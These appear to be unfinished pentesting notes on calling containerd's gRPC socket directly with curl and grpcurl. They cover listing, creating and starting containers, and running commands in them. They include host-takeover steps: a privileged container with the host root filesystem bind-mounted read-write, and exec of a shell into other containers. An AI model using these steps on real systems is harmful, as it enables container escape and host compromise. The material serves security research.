* /containerd.services.containers.v1.Containers/Get
      Input: GetContainerRequest
      Output: GetContainerResponse
* /containerd.services.containers.v1.Containers/List
      Input: ListContainersRequest
      Output: ListContainersResponse
* /containerd.services.containers.v1.Containers/ListStream
      Input: ListContainersRequest
      Output: ListContainerMessage
* /containerd.services.containers.v1.Containers/Create
      Input: CreateContainerRequest
      Output: CreateContainerResponse
* /containerd.services.containers.v1.Containers/Update
      Input: UpdateContainerRequest
      Output: UpdateContainerResponse
* /containerd.services.containers.v1.Containers/Delete
      Input: DeleteContainerRequest
      Output: Empty
```


We use the `/containerd.services.containers.v1.Containers/Create`, which uses the `CreateContainerRequest` and `CreateContainerResponse` messages, which look like the following:

```
* CreateContainerRequest
  Fields:
      container - Container

  Rough JSON example (might need tweaking):

{
    "container": {"id": "string", "labels": "LabelsEntry", "image": "string", "runtime": "Runtime", "spec": "Any", "snapshotter": "string", "snapshot_key": "string", "created_at": "Timestamp", "updated_at": "Timestamp", "extensions": "ExtensionsEntry", "sandbox": "string"}
}

==================================
* CreateContainerResponse
  Fields:
      container - Container

  Rough JSON example (might need tweaking):

{
    "container": {"id": "string", "labels": "LabelsEntry", "image": "string", "runtime": "Runtime", "spec": "Any", "snapshotter": "string", "snapshot_key": "string", "created_at": "Timestamp", "updated_at": "Timestamp", "extensions": "ExtensionsEntry", "sandbox": "string"}
}

```

To create the container we need to put together a container definition request. These are actually pretty complex so I will break it up a little. This is the basic structure of the request with the containerspec (the most complex part) excluded. The below includes `labels` taken from the `docker.io/library/nginx:1.14.2` image definition that we looked up earlier, and the `snapshot` values refer to the snapshot we prepared.


```
{
  "container": {
    "id": "nginx",
    "labels": {
      "maintainer": "NGINX Docker Maintainers <docker-maint@nginx.com>",
      "io.cri-containerd.image": "managed",
      "io.containerd.image.config.stop-signal": "SIGTERM"
    },
    "image": "docker.io/library/nginx:1.14.2",
    "runtime": {
      "name": "io.containerd.runc.v2",
      "options": {
        "type_url": "containerd.runc.v1.Options"
      }
    },
    "spec": {
      "type_url": "types.containerd.io/opencontainers/runtime-spec/1/Spec",
      "value": "CONTAINER_SPEC_HERE" 
    },
    "snapshotter": "overlayfs",
    "snapshot_key": "nginx"
  }
}
```

We are going to base [here](https://github.com/stephenbradshaw/pentesting_stuff/blob/master/containerd/basecontainerspec.json)



sudo curl -s -v --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"  -H "user-agent: grpc-go/1.59.0"  -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.containers.v1.Containers/Create --data-binary @createcontainer1.bin --output createcontainerresponse.bin



































echo -ne "\x00\x00\x00\x00\x4c\x0a\x47\x73\x68\x61\x32\x35\x36\x3a\x37\x30\x36\x34\x34\x36\x65\x39\x63\x36\x36\x36\x37\x63\x30\x38\x38\x30\x64\x35\x64\x61\x33\x66\x33\x39\x63\x30\x39\x61\x36\x63\x37\x64\x32\x31\x31\x34\x66\x35\x61\x35\x64\x36\x62\x37\x34\x61\x32\x66\x61\x66\x64\x32\x34\x61\x65\x33\x30\x64\x32\x30\x37\x38\x18\xb4\x07" | curl -s -v --http2-prior-knowledge --unix-socket /tmp/http2 -X POST  -H "content-type: application/grpc"  -H "user-agent: grpc-go/1.59.0"  -H "te: trailers"  -H "containerd-lease: 21254611-xKxz"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.content.v1.Content/Read --data-binary @- --output FILENAME




https://github.com/containerd/containerd/blob/2ac2b9c909fb64f4d06958a0ca2f556bec348d05/api/services/content/v1/content.proto


Content/Read to get specific details about the container setup

Use the id from previous 


b'\x00\x00\x00\x00I\nGsha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d'

$ echo -ne "\x00\x00\x00\x00\x49\x0a\x47\x73\x68\x61\x32\x35\x36\x3a\x66\x37\x39\x38\x38\x66\x62\x36\x63\x30\x32\x65\x30\x63\x65\x36\x39\x32\x35\x37\x64\x39\x62\x64\x39\x63\x66\x33\x37\x61\x65\x32\x30\x61\x36\x30\x66\x31\x64\x66\x37\x35\x36\x33\x63\x33\x61\x32\x61\x36\x61\x62\x65\x32\x34\x31\x36\x30\x33\x30\x36\x62\x38\x64" | sudo curl -s -v --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"  -H "user-agent: grpc-go/1.59.0"  -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.content.v1.Content/Info --data-binary @- --output /tmp/contentinfo.bin



  labels {
    key: "containerd.io/gc.ref.content.m.0"
    value: "sha256:706446e9c6667c0880d5da3f39c09a6c7d2114f5a5d6b74a2fafd24ae30d2078"
  }





706446e9c6667c0880d5da3f39c09a6c7d2114f5a5d6b74a2fafd24ae30d2078

/containerd.services.content.v1.Content/Read









https://github.com/containerd/containerd/blob/2ac2b9c909fb64f4d06958a0ca2f556bec348d05/api/services/containers/v1/containers.proto


```
$ sudo curl -v -s --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc" -H "te: trailers"  -H "grpc-accept-encoding: gzip" -H "containerd-namespace: k8s.io" http://localhost/containerd.services.containers.v1.Containers/Create --data-binary @/tmp/basiccontainer.spec --output /tmp/createcontainerresponse.bin
*   Trying /run/containerd/containerd.sock:0...
* Connected to localhost (/run/containerd/containerd.sock) port 80 (#0)
* Using HTTP2, server supports multiplexing
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x560c2263eeb0)
> POST /containerd.services.containers.v1.Containers/Create HTTP/2
> Host: localhost
> user-agent: curl/7.81.0
> accept: */*
> content-type: application/grpc
> te: trailers
> grpc-accept-encoding: gzip
> containerd-namespace: k8s.io
> content-length: 903
>
} [903 bytes data]
* We are completely uploaded and fine
* Connection state changed (MAX_CONCURRENT_STREAMS == 4294967295)!
< HTTP/2 200
< content-type: application/grpc
<
{ [931 bytes data]
< grpc-status: 0
< grpc-message:
* Connection #0 to host localhost left intact

```




https://github.com/containerd/containerd/blob/2ac2b9c909fb64f4d06958a0ca2f556bec348d05/api/services/snapshots/v1/snapshots.proto


sudo curl -v -s --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc" -H "te: trailers"  -H "grpc-accept-encoding: gzip" -H "containerd-namespace: k8s.io" http://localhost/containerd.services.snapshots.v1.Snapshots/Mounts --data-binary @/tmp/mounstsrequest.bin --output /tmp/mountsresponse.bin





https://github.com/containerd/containerd/blob/2ac2b9c909fb64f4d06958a0ca2f556bec348d05/api/services/tasks/v1/tasks.pb.go





```
$ ./protobuf_parser.py -m tasks_pb2.py
Services:
* /containerd.services.tasks.v1.Tasks/Create
      Input: CreateTaskRequest
      Output: CreateTaskResponse
* /containerd.services.tasks.v1.Tasks/Start
      Input: StartRequest
      Output: StartResponse
* /containerd.services.tasks.v1.Tasks/Delete
      Input: DeleteTaskRequest
      Output: DeleteResponse
* /containerd.services.tasks.v1.Tasks/DeleteProcess
      Input: DeleteProcessRequest
      Output: DeleteResponse
* /containerd.services.tasks.v1.Tasks/Get
      Input: GetRequest
      Output: GetResponse
* /containerd.services.tasks.v1.Tasks/List
      Input: ListTasksRequest
      Output: ListTasksResponse
* /containerd.services.tasks.v1.Tasks/Kill
      Input: KillRequest
      Output: Empty
* /containerd.services.tasks.v1.Tasks/Exec
      Input: ExecProcessRequest
      Output: Empty
* /containerd.services.tasks.v1.Tasks/ResizePty
      Input: ResizePtyRequest
      Output: Empty
* /containerd.services.tasks.v1.Tasks/CloseIO
      Input: CloseIORequest
      Output: Empty
* /containerd.services.tasks.v1.Tasks/Pause
      Input: PauseTaskRequest
      Output: Empty
* /containerd.services.tasks.v1.Tasks/Resume
      Input: ResumeTaskRequest
      Output: Empty
* /containerd.services.tasks.v1.Tasks/ListPids
      Input: ListPidsRequest
      Output: ListPidsResponse
* /containerd.services.tasks.v1.Tasks/Checkpoint
      Input: CheckpointTaskRequest
      Output: CheckpointTaskResponse
* /containerd.services.tasks.v1.Tasks/Update
      Input: UpdateTaskRequest
      Output: Empty
* /containerd.services.tasks.v1.Tasks/Metrics
      Input: MetricsRequest
      Output: MetricsResponse
* /containerd.services.tasks.v1.Tasks/Wait
      Input: WaitRequest
      Output: WaitResponse

==================================

```








```
==================================
* StartRequest
  Fields:
      container_id - string
      exec_id - string

  Rough JSON example (might need tweaking):

{
    "container_id": "string",
    "exec_id": "string"
}

==================================
* StartResponse
  Fields:
      pid - uint32

  Rough JSON example (might need tweaking):

{
    "pid": uint32
}

```




sudo curl -v -s --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc" -H "te: trailers"  -H "grpc-accept-encoding: gzip" -H "containerd-namespace: k8s.io" http://localhost/containerd.services.tasks.v1.Tasks/Start --data-binary @/tmp/startrequest.bin --output /tmp/startreponse.bin





sudo ctr --address /tmp/http2 -n k8s.io containers create --privileged --mount 'type=bind,src=/,dst=/host,options=rbind:rw' 'docker.io/library/nginx:1.14.2' nginx

sudo ctr --address /tmp/http2 -n k8s.io task start --detach nginx



### Executing code in running containers with curl




Create a task

sudo curl -v -s --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"   -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.tasks.v1.Tasks/Exec --data-binary @/tmp/execbasic.bin --output /tmp/to1

Start the task

sudo curl -v -s --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"   -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.tasks.v1.Tasks/Start --data-binary @/tmp/start.bin --output /tmp/startresponse.bin

Delete the task

sudo curl -v -s --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"   -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.tasks.v1.Tasks/DeleteProcess --data-binary @/tmp/deleteprocess.bin --output /tmp/deleteprocessresponse.bin









### Deleting a container with curl












[grpcurl](https://github.com/fullstorydev/grpcurl)



curl -s --unix-socket /var/run/docker.sock http:/containers/json


https://labs.iximiuz.com/courses/containerd-cli/ctr/container-management



ctr list namespaces


sudo ctr --address /var/run/containerd/containerd.sock ns ls


ctr list containers in given namespace "k8s.io"s

sudo ctr --address /var/run/containerd/containerd.sock -n k8s.io containers list


Running things in another container from within a container (with name a1c07c5799a7bae37d9322075bda1d709c60fa129d04522bb452dfcc610b2f24) and host root fs mounted at /host in container

mkdir /host/tmp/offsec
ln -s /host/tmp/offsec /tmp/offsec
ctr --address /host/run/containerd/containerd.sock -n k8s.io task exec -t --exec-id 1 --fifo-dir /tmp/offsec  a1c07c5799a7bae37d9322075bda1d709c60fa129d04522bb452dfcc610b2f24  /bin/bash


Fifo dir must be supplied as from the perspective of the host node, but the file also must be accessible from the executing container



sudo ctr --address /run/containerd/containerd.sock -n k8s.io task exec -t --exec-id 1 992f72e87e8f3d31b307162f29f5ec38be6018560529e750e0321fb3a6a03f95 cat /etc/passwd




/containerd.services.tasks.v1.Tasks/Exec


/containerd.services.tasks.v1.Tasks/Start




sudo curl -v -s --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"  -H "user-agent: grpc-go/1.59.0"  -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.tasks.v1.Tasks/Start --data-binary @/tmp/start.bin --output /tmp/startresponse.bin




sudo curl -v -s --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"  -H "user-agent: grpc-go/1.59.0"  -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.tasks.v1.Tasks/DeleteProcess --data-binary @/tmp/deleteprocess.bin --output /tmp/deleteprocessresponse.bin







https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket


List namespaces
List containers
Create a container
Start a container
Code execution in a container
Host takeover (host root mount in a new container you run)


With http2 capable curl


Version

echo -ne "\x00\x00\x00\x00\x00" | sudo curl -v -s --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"  -H "user-agent: grpcurl/v1.9.2 grpc-go/1.61.0"  -H "te: trailers"  -H "grpc-accept-encoding: gzip" http://localhost/containerd.services.version.v1.Version/Version --data-binary @- --output /tmp/122


List namespaces

echo -en '\x00\x00\x00\x00\x00' | sudo curl -v -s --unix-socket /run/containerd/containerd.sock --http2-prior-knowledge -x POST http://localhost/containerd.services.namespaces.v1.Namespaces/List -H "Content-Type: application/grpc" -H "containerd-namespace: k8s.io" -H "grpc-accept-encoding: gzip" --data-binary @- --output /tmp/ns.dat


List containers in given namespace

echo -en '\x00\x00\x00\x00\x00' | sudo curl -v -s --unix-socket /run/containerd/containerd.sock --http2-prior-knowledge -x POST http://localhost/containerd.services.containers.v1.Containers/List -H "Content-Type: application/grpc" -H "containerd-namespace: k8s.io" -H "grpc-accept-encoding: gzip" --data-binary @- --output /tmp/data4.dat


Code execution in container

Create a task

sudo curl -v -s --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"  -H "user-agent: grpc-go/1.59.0"  -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.tasks.v1.Tasks/Exec --data-binary @/tmp/execbasic.bin --output /tmp/to1

Start the task

sudo curl -v -s --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"  -H "user-agent: grpc-go/1.59.0"  -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.tasks.v1.Tasks/Start --data-binary @/tmp/start.bin --output /tmp/startresponse.bin

Delete the task

sudo curl -v -s --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"  -H "user-agent: grpc-go/1.59.0"  -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.tasks.v1.Tasks/DeleteProcess --data-binary @/tmp/deleteprocess.bin --output /tmp/deleteprocessresponse.bin







sudo curl -v -s --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc"  -H "user-agent: grpc-go/1.59.0"  -H "te: trailers"  -H "containerd-namespace: k8s.io" http://localhost/containerd.services.tasks.v1.Tasks/DeleteProcess --data-binary @/tmp/deleteprocess.bin --output /tmp/deleteprocessresponse.bin


/containerd.services.tasks.v1.Tasks/Exec


exec.json
```
{
    "container_id": "992f72e87e8f3d31b307162f29f5ec38be6018560529e750e0321fb3a6a03f95",
    "stdout": "/tmp/test/testtask-stdout",
    "spec": {
        "type_url": "types.containerd.io/opencontainers/runtime-spec/1/Process",
        "value": {
            "user": {
                "uid": 1000,
                "gid": 1000
            },
            "args": [
                "cat",
                "/etc/passwd"
            ],
            "env": [
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
            ],
            "cwd": "/home/ubuntu"
        }
    },
    "exec_id": "testtask"
}
```


start.json
```
{
    "container_id": "992f72e87e8f3d31b307162f29f5ec38be6018560529e750e0321fb3a6a03f95",
    "exec_id": "testtask"
}
```





mkfifo /tmp/test/testtask-stdout
tail -f -n 200 /tmp/test/testtask-stdout




5 bytes of all nulls is the gRPC Length-Prefixed-Message for no data
https://github.com/grpc/grpc/blob/master/doc/PROTOCOL-HTTP2.md





https://github.com/containerd/containerd/tree/main/api/services


When getting .proto files manually check for deps

wget https://github.com/containerd/containerd/raw/main/api/services/version/v1/version.proto
wget https://github.com/containerd/containerd/raw/main/api/services/containers/v1/containers.proto
wget https://github.com/containerd/containerd/raw/main/api/services/namespaces/v1/namespace.proto
wget https://github.com/containerd/containerd/raw/main/api/services/tasks/v1/tasks.proto


Dependant types (must create these individually and fix the imports)

wget https://github.com/containerd/containerd/raw/main/api/types/mount.proto
wget https://github.com/containerd/containerd/raw/main/api/types/descriptor.proto
wget https://github.com/containerd/containerd/raw/main/api/types/metrics.proto
wget https://github.com/containerd/containerd/raw/main/api/types/task/task.proto

import "mount.proto";
import "metrics.proto";
import "descriptor.proto";
import "task.proto";


bin/protoc --python_out=. namespace.proto
bin/protoc --python_out=. version.proto
bin/protoc --python_out=. containers.proto



mkdir -p github.com/containerd/containerd/api/types/task 
bin/protoc  --python_out=. tasks.proto



wget https://github.com/protocolbuffers/protobuf/releases/download/v29.2/protoc-29.2-linux-x86_64.zip








https://medium.com/@aref.riant/talking-to-containerd-grpc-afa4b185e444

wget https://github.com/fullstorydev/grpcurl/releases/download/v1.8.7/grpcurl_1.8.7_linux_x86_64.tar.gz

sudo ./grpcurl -rpc-header "containerd-namespace: k8s.io" -plaintext -proto containers.proto unix:///run/containerd/containerd.sock containerd.services.containers.v1.Containers/List
sudo ./grpcurl -plaintext -proto version.proto unix:///run/containerd/containerd.sock containerd.services.version.v1.Version/Version




sudo ./grpcurl -plaintext -proto version.proto unix:///tmp/http2 containerd.services.version.v1.Version/Version
sudo ./grpcurl -rpc-header "containerd-namespace: k8s.io" -plaintext -proto containers.proto unix:///tmp/http2 containerd.services.containers.v1.Containers/List



[<RequestReceived stream_id:1, headers:[(':method', 'POST'), (':scheme', 'http'), (':path', '/containerd.services.containers.v1.Containers/List'), (':authority', 'localhost'), ('content-type', 'application/grpc'), ('user-agent', 'grpcurl/v1.9.2 grpc-go/1.61.0'), ('te', 'trailers'), ('grpc-accept-encoding', 'gzip'), ('containerd-namespace', 'k8s.io')]>, <DataReceived stream_id:1, flow_controlled_length:5, data:0000000000>, <StreamEnded stream_id:1>]



curl --unix-socket /run/containerd/containerd.sock --http2-prior-knowledge -x POST http://localhost/containerd.services.containers.v1.Containers/List -H "Content-Type: application/grpc" -H "grpc-accept-encoding: gzip" -H "containerd-namespace: k8s.io" -d ""


echo -en '\x00\x00\x00\x00\x00' | sudo curl -s --unix-socket /run/containerd/containerd.sock --http2-prior-knowledge -x POST http://localhost/containerd.services.namespaces.v1.Namespaces/List -H "Content-Type: application/grpc" -H "containerd-namespace: k8s.io" -H "grpc-accept-encoding: gzip" --data-binary @- --output -




https://github.com/containerd/containerd/raw/main/api/services/version/v1/version.proto
https://github.com/containerd/containerd/raw/main/api/services/containers/v1/containers.proto



./grpc-curl --help
grpc-curl 1.4.0 - 2024 (c) Copyright Alexandre Mutel

Usage: grpc-curl [options] <address:port> <service/method>

Arguments:
  address:port             A http/https URL or a simple host:address. If only host:address is used, HTTPS is used by default unless the options
                           --http is passed.
  service/method           The service/method that will be called.

Options:
  --version                Show version information.
  -?|-h|--help             Show help information.
  -d|--data <json_string>  JSON string to send as a message.
  --http                   Use HTTP instead of HTTPS unless the protocol is specified directly on the address.
  --json                   Use JSON naming for input and output.
  --describe               Describe the service or dump all services available.





sudo curl -s --unix-socket /run/containerd/containerd.sock --http2-prior-knowledge -x POST http://localhost/containerd.services.containers.v1.Containers/List -H "Content-Type: application/grpc" -H "grpc-accept-encoding: gzip" -H "containerd-namespace: k8s.io" --data-binary @/tmp/zeros --output /tmp/out1



sudo curl -s --unix-socket /run/containerd/containerd.sock --http2-prior-knowledge -x POST http://localhost/containerd.services.version.v1.Version/Version -H "Content-Type: application/grpc" -H "grpc-accept-encoding: gzip" --data-binary @/tmp/zeros



Test with the version command

echo -en '\x00\x00\x00\x00\x00' | sudo curl -s --unix-socket /run/containerd/containerd.sock --http2-prior-knowledge -x POST http://localhost/containerd.services.version.v1.Version/Version -H "Content-Type: application/grpc" -H "grpc-accept-encoding: gzip" --data-binary @- --output - | strings




echo -en '\x00\x00\x00\x00\x00' | sudo curl -s --unix-socket /run/containerd/containerd.sock --http2-prior-knowledge -x POST http://localhost/containerd.services.containers.v1.Containers/List -H "Content-Type: application/grpc" -H "containerd-namespace: k8s.io" -H "grpc-accept-encoding: gzip" --data-binary @- --output - | strings






response is in application/grpc



--output - to send to stdout or name a file or pipe into strings or xxd



--data-binary @-



=======

create container


/containerd.services.images.v1.Images/Get
b'\x00\x00\x00\x00 \n\x1edocker.io/library/nginx:1.14.2'


response from above

/containerd.services.content.v1.Content/Info
b'\x00\x00\x00\x00I\nGsha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d'




/containerd.services.content.v1.Content/Info
b'\x00\x00\x00\x00I\nGsha256:706446e9c6667c0880d5da3f39c09a6c7d2114f5a5d6b74a2fafd24ae30d2078'


response
{'body': b'\x00\x00\x00\x02`\n\xdd\x04\nGsha256:706446e9c6667c0880d5da3f39c09a6c7d2114f5a5d6b74a2fafd24ae30d2078\x10\xb4\x07\x1a\x0c\x08\xa4\xd9\xbc\xa9\x06\x10\x8f\xa8\xaf\x85\x02"\x0c\x08\xb2\xd9\xbc\xa9\x06\x10\x84\xbd\xb9\x88\x02*k\n containerd.io/gc.ref.content.l.0\x12Gsha256:27833a3ba0a545deda33bb01eaf95a14d05d43bf30bce9267d92d17f069fe897*k\n containerd.io/gc.ref.content.l.1\x12Gsha256:0f23e58bd0b7c74311703e20c21c690a6847e62240ed456f8821f4c067d3659b*k\n containerd.io/gc.ref.content.l.2\x12Gsha256:8ca774778e858d3f97d9ec1bec1de879ac5e10096856dc22ed325a3ad944f78a*<\n+containerd.io/distribution.source.docker.io\x12\rlibrary/nginx*n\n#containerd.io/gc.ref.content.config\x12Gsha256:295c7be079025306c4f1d65997fcf7adb411c88f139ad1d34b537164aa060369', 'headers': [(':status', '200'), ('content-type', 'application/grpc')], 'trailers': [('grpc-status', '0'), ('grpc-message', '')]}



snapshot prepare

/containerd.services.snapshots.v1.Snapshots/Prepare
b'\x00\x00\x00\x00[\n\toverlayfs\x12\x05nginx\x1aGsha256:19606512dfe192788a55d7c1efb9ec02041b4e318587632f755c5112f927e0e3'



content response for image of nginx...
f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d

```
$ ./protobuf_parser.py -m content_pb2.py -d /tmp/contentinfo.bin -t InfoResponse
info {
  digest: "sha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d"
  size: 2029
  created_at {
    seconds: 1697590436
    nanos: 271025136
  }
  updated_at {
    seconds: 1697590450
    nanos: 553243954
  }
  labels {
    key: "containerd.io/gc.ref.content.m.5"
    value: "sha256:e76ff864168bca4ef1a53cfaf5fb4981cdb2810385b4b4edc19fd94a5d04eb38"
  }
  labels {
    key: "containerd.io/gc.ref.content.m.4"
    value: "sha256:750c35f5051eebd0d1a2faa08a29d3eabd330c8cf0350b57353d205a99c47176"
  }
  labels {
    key: "containerd.io/gc.ref.content.m.3"
    value: "sha256:de4556bb2971a581b6ce23bcbfd3dbef6ee1640839d2c88b3e846a4e101f363c"
  }
  labels {
    key: "containerd.io/gc.ref.content.m.2"
    value: "sha256:d58b3e481b8588c080b42e5d7427f2c2061decbf9194f06e2adce641822e282a"
  }
  labels {
    key: "containerd.io/gc.ref.content.m.1"
    value: "sha256:17a1998407746106c307c58c5089569bc1d0728567657b8c19ccffd0497c91ba"
  }
  labels {
    key: "containerd.io/gc.ref.content.m.0"
    value: "sha256:706446e9c6667c0880d5da3f39c09a6c7d2114f5a5d6b74a2fafd24ae30d2078"
  }
  labels {
    key: "containerd.io/distribution.source.docker.io"
    value: "library/nginx"
  }
}
```







